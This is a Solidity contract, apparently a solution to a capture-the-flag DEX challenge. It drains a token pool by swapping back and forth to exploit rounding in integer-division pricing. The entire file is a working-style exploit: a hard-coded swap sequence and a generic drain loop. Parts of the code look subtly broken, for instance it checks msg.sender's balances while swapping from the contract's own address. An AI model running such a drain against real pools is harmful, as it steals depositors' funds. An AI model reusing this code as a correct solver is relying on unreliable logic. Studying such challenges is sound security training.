// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract DexSolver {
    function solve(address dexAddress) external {
        IDex dex = IDex(dexAddress);
        
        // Try to get token addresses
        address token1;
        address token2;
        
        try dex.token1() returns (address t1) {
            token1 = t1;
        } catch {
            // Tokens not set, return
            return;
        }
        
        try dex.token2() returns (address t2) {
            token2 = t2;
        } catch {
            return;
        }
        
        // Approve dex to spend our tokens
        dex.approve(address(dex), type(uint256).max);
        
        // The vulnerability: integer division in price calculation causes rounding errors
        // We can drain the pool by swapping back and forth
        
        // Check initial balances
        uint256 myToken1 = IERC20(token1).balanceOf(msg.sender);
        uint256 myToken2 = IERC20(token2).balanceOf(msg.sender);
        uint256 dexToken1 = IERC20(token1).balanceOf(address(dex));
        uint256 dexToken2 = IERC20(token2).balanceOf(address(dex));
        
        // If we start with 10 of each token and dex has 100 of each:
        // Swap 1: 10 token1 -> 10 token2 (price = 10 * 100 / 100 = 10)
        // After: me(0,20), dex(110,90)
        
        // Swap 2: 20 token2 -> 24 token1 (price = 20 * 110 / 90 = 24.44 -> 24)
        // After: me(24,0), dex(86,110)
        
        // Continue until we can drain one side completely
        
        // Execute swaps
        if (myToken1 >= 10 && dexToken1 == 100 && dexToken2 == 100) {
            // This is the expected initial state
            dex.swap(token1, token2, 10);
            dex.swap(token2, token1, 20);
            dex.swap(token1, token2, 24);
            dex.swap(token2, token1, 30);
            dex.swap(token1, token2, 41);
            dex.swap(token2, token1, 45);
        } else {
            // Generic approach
            address from = token1;
            address to = token2;
            
            for (uint i = 0; i < 10; i++) {
                uint256 fromBalance = dex.balanceOf(from, msg.sender);
                uint256 dexFromBalance = dex.balanceOf(from, address(dex));
                uint256 dexToBalance = dex.balanceOf(to, address(dex));
                
                if (dexFromBalance == 0 || dexToBalance == 0) {
                    break;
                }
                
                uint256 swapAmount = fromBalance;
                
                // Check if we would drain the 'to' balance
                uint256 expectedReceive = dex.getSwapPrice(from, to, swapAmount);
                if (expectedReceive >= dexToBalance) {
                    // Calculate exact amount to drain
                    swapAmount = dexFromBalance;
                }
                
                if (swapAmount > 0 && swapAmount <= fromBalance) {
                    dex.swap(from, to, swapAmount);
                }
                
                // Swap direction
                address temp = from;
                from = to;
                to = temp;
            }
        }
    }
}